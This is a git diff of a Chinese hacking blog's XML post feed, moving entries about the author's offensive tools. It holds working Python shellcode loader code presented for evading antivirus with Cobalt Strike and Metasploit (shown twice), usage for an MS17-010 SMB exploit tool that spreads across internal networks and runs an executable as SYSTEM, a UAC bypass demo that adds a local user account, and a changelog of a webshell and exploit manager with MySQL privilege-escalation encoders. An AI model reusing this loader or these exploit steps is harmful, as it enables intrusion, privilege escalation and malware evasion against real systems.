20140721<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键删除增加是否删除提示,免得误删Shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140720<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键EXP按钮可删除和修改当前按钮对应EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140716<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 动态创建按钮加载对应Payload,生成漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140714<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 一键添加EXP到Web_Exploit模块数据库功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140711<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; None模式(只浏览网页不提交任何数据)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140711<br>=================================================================================<br>K8飞刀 20140707<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cookie格式不对,提交闪退的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140707<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意文件 转换HEX编码(16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意文件 转换CHR编码(ASC码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDF提权 MYSQL HEX格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDF提权 MYSQL CHR格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MOF提权 MYSQL HEX格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MOF提权 MYSQL CHR格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 伪造 HTTP Referer (请求来源)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140626<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userAgent 自定义编辑&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140608<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userAgent修复(之前版本忘了加了)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140423<br>=================================================================================<br>[+]之前的 回忆过去,痛苦的相思忘不了.</p>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Exp</tag>
       </tags>
   </entry>
   <entry>
@@ -4045,11 +4045,11 @@ Microsoft Windows 10 for 32-bit Systems 0
 </tbody></table>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>工具</category>
+        <category>Ladon</category>
         <category>源码</category>
-        <category>编程</category>
         <category>Python</category>
+        <category>编程</category>
       </categories>
       <tags>
         <tag>Tool</tag>
@@ -4186,8 +4186,8 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
 <p><a href="https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py" target="_blank">&nbsp;https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py</a></p>
 ]]></content>
       <categories>
-        <category>Exp</category>
         <category>工具</category>
+        <category>Exp</category>
       </categories>
       <tags>
         <tag>Tool</tag>
@@ -4197,117 +4197,53 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
       </tags>
   </entry>
   <entry>
-    <title>Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</title>
-    <url>/p/f3512dbc.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
-<p>采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。</p>
-<p>本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。</p>
-<p>PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。</p>
-<p>如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。</p>
-<p>再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？</p>
-<p><span style="font-size: 18px;"><strong>0x002 ShellCode免杀</strong></span></p>
-<p>CS可生成很多种格式的ShellCode，具体该用哪一种呢？</p>
-<p>由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。</p>
-<p>其实不用测都知道HEX字串肯定比RAW或标准C格式安全。</p>
-<p>因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。</p>
-<p>当然实际上使用任意格式都可以，前提是需要加解密。</p>
-<p>下面我们拿CS3.13的ShellCode来做个对比，结果如下</p>
-<p>CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)<br>http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635<br>将CS的ShellCode转成Hex无一杀软查杀(hex.txt)<br>http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d</p>
-<p><span style="font-size: 18px;"><strong>0x003 加载器</strong></span></p>
-<p>以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单</p>
-<p>缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。</p>
-<p>其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解</p>
-<p>ScRunHex.py</p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">#scrun by k8gege
-import ctypes
-import sys
-#calc.exe
-#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
-shellcode=bytearray(sys.argv[1].decode("hex"))
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
-
-<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
-<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
-<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
-<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
-</div>
-<pre class="brush:python;gutter:true;"></pre>
-<p>下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候，</p>
-<p>首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。</p>
-<p>除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun1.png"></p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>&nbsp;0x004 实战CS上线<br></strong></span></p>
-<p><span style="font-size: 18px; color: #ff00ff;"><strong>一、Hex ShellCode</strong></span></p>
-<p>1.首先使用CS生成标准C格式的payload，格式（\xfc\xe8\x89\x00）在飞刀里我定义为Char格式</p>
-<p>2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。</p>
-<p>具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex</p>
-<p>其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun2.png"></p>
-<p>3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。</p>
-<p>如果我没记错此方式目前也还能过Win10系统自带的Defender</p>
-<p>不知大家有没发现Hex字符串除了不被杀以外，还无需落地</p>
-<p>而Bin文件需要落地且被Defender杀(这个我肯定没有记错)</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun3.png"></p>
-<p><span style="color: #ff00ff;"><strong>二、Base64(Hex) ShellCode</strong></span></p>
-<p>当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun4.png"></p>
-<p>ScRunBase64.py 执行Base64格式ShellCode代码如下</p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">#scrun by k8gege
-import ctypes
-import sys
-import base64
-#calc.exe
-#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
-shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
-
-<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
-<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
-<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
-<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
-</div>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
 <p>&nbsp;</p>
-<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x005 下载</span></strong></span></p>
-<p>&nbsp;<a href="https://github.com/k8gege/scrun" target="_blank">https://github.com/k8gege/scrun</a></p>
-<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.exe</a></p>
-<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.py</a></p>
-<p>&nbsp;</p>
-<p>PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload?</p>
-<p>那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload?</p>
-<p>溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。</p>
-<p>此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。</p>
-<p>但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。</p>
-<p>同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。</p>
-<p>其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马</p>
-<p>发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。</p>
-<p>ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。</p>
-<p>所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。</p>
-<p>而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了</p>
-<p>看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？</p>
-<p>现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件</p>
-<p>当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法</p>
-<p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
       <categories>
-        <category>工具</category>
-        <category>免杀</category>
-        <category>Metasploit</category>
-        <category>Cobalt Strike</category>
-        <category>ShellCode</category>
-        <category>Python</category>
+        <category>Exp</category>
+        <category>提权</category>
       </categories>
       <tags>
         <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-        <tag>Metasploit</tag>
-        <tag>BypassAV</tag>
+        <tag>Exp</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
+    <url>/p/41e1c61c.html</url>
+    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
+<p>工具: k8uac<br>编译: VC++</p>
+<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
+<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
+<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
+<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
+<p>示例如下:</p>
+<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
+<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Exp</tag>
+        <tag>BypassUAC</tag>
       </tags>
   </entry>
   <entry>
@@ -4457,9 +4393,9 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
 <p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
       <categories>
+        <category>工具</category>
         <category>Exp</category>
         <category>Ladon</category>
-        <category>工具</category>
       </categories>
       <tags>
         <tag>Tool</tag>
@@ -4469,53 +4405,117 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
       </tags>
   </entry>
   <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+    <title>Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</title>
+    <url>/p/f3512dbc.html</url>
+    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
+<p>采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。</p>
+<p>本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。</p>
+<p>PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。</p>
+<p>如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。</p>
+<p>再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？</p>
+<p><span style="font-size: 18px;"><strong>0x002 ShellCode免杀</strong></span></p>
+<p>CS可生成很多种格式的ShellCode，具体该用哪一种呢？</p>
+<p>由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。</p>
+<p>其实不用测都知道HEX字串肯定比RAW或标准C格式安全。</p>
+<p>因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。</p>
+<p>当然实际上使用任意格式都可以，前提是需要加解密。</p>
+<p>下面我们拿CS3.13的ShellCode来做个对比，结果如下</p>
+<p>CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)<br>http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635<br>将CS的ShellCode转成Hex无一杀软查杀(hex.txt)<br>http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d</p>
+<p><span style="font-size: 18px;"><strong>0x003 加载器</strong></span></p>
+<p>以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单</p>
+<p>缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。</p>
+<p>其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解</p>
+<p>ScRunHex.py</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#scrun by k8gege
+import ctypes
+import sys
+#calc.exe
+#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
+shellcode=bytearray(sys.argv[1].decode("hex"))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
+<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
+<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
+<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
+</div>
+<pre class="brush:python;gutter:true;"></pre>
+<p>下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候，</p>
+<p>首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。</p>
+<p>除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun1.png"></p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>&nbsp;0x004 实战CS上线<br></strong></span></p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>一、Hex ShellCode</strong></span></p>
+<p>1.首先使用CS生成标准C格式的payload，格式（\xfc\xe8\x89\x00）在飞刀里我定义为Char格式</p>
+<p>2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。</p>
+<p>具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex</p>
+<p>其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun2.png"></p>
+<p>3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。</p>
+<p>如果我没记错此方式目前也还能过Win10系统自带的Defender</p>
+<p>不知大家有没发现Hex字符串除了不被杀以外，还无需落地</p>
+<p>而Bin文件需要落地且被Defender杀(这个我肯定没有记错)</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun3.png"></p>
+<p><span style="color: #ff00ff;"><strong>二、Base64(Hex) ShellCode</strong></span></p>
+<p>当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun4.png"></p>
+<p>ScRunBase64.py 执行Base64格式ShellCode代码如下</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;">#scrun by k8gege
+import ctypes
+import sys
+import base64
+#calc.exe
+#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
+shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                          ctypes.c_int(len(shellcode)),
+                                          ctypes.c_int(0x3000),
+                                          ctypes.c_int(0x40))
+
+<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
+<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
+<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
+<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
+</div>
 <p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x005 下载</span></strong></span></p>
+<p>&nbsp;<a href="https://github.com/k8gege/scrun" target="_blank">https://github.com/k8gege/scrun</a></p>
+<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.exe</a></p>
+<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.py</a></p>
+<p>&nbsp;</p>
+<p>PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload?</p>
